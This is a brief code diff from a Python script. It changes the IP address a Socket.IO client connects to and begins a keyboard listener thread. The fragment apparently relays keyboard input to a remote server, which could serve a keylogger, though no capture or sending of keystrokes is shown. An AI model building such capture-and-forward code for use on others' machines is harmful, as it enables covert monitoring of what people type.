@@ -86,7 +86,7 @@ def msg(data):
 # host = '127.0.0.1'
 
 # Connect to server
-sio.connect('http://111.111.1.59:5000/')
+sio.connect('http://111.111.1.62:5000/')
 
 # Create keyboard listener thread
 key_listener = keyboard.Listener(
